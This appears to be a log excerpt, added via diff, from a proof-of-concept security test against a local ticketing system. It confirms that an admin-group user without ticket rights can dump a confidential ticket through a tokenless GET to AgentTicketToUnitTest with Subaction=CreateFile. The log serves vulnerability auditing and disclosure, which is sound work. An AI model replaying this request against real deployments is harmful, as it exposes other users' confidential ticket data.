@@ -1,0 +1,12 @@
+==========================================================================
+VULN-029: AgentTicketToUnitTest dumps ANY ticket (admin-group, no ticket authz)
+Target: http://localhost:25114
+[INFO] no TicketPermission + no ChallengeToken; only gate is admin-frontend group
+==========================================================================
+[SETUP] attacker att029_47af9fb4 — member of 'admin' frontend group only (no queue rights)
+[SETUP] victim ticket TID=71 (title carries marker CONFIDENTIAL-VULN029-47af9fb4) in off-limits queue vq029_47af9fb4
+[PROOF] attacker TicketPermission on victim 71: {'ro': 0, 'note': 0, 'rw': 0} (all 0 = no ticket rights)
+[STEP] attacker GET AgentTicketToUnitTest;Subaction=CreateFile;TicketID=71
+[PROOF] HTTP 200; Content-Disposition='attachment;  filename="UnitTest-Example Company-71.t"; filename*=utf-8\'\'UnitTest-Example%20Company-71.t'; victim marker in dump: True
+[OK] exploit confirmed — admin-group attacker with NO ticket rights on queue vq029_47af9fb4 dumped victim ticket 71 (marker 'CONFIDENTIAL-VULN029-47af9fb4' present) via a tokenless GET — missing per-ticket authorization + CSRF on AgentTicketToUnitTest.
+==> VULN-029: CONFIRMED — admin-group attacker with NO ticket rights on queue vq029_47af9fb4 dumped victim ticket 71 (marker 'CONFIDENTIAL-VULN029-47af9fb4' present) via a tokenless GET — missing per-ticket authorization + CSRF on AgentTicketToUnitTest.
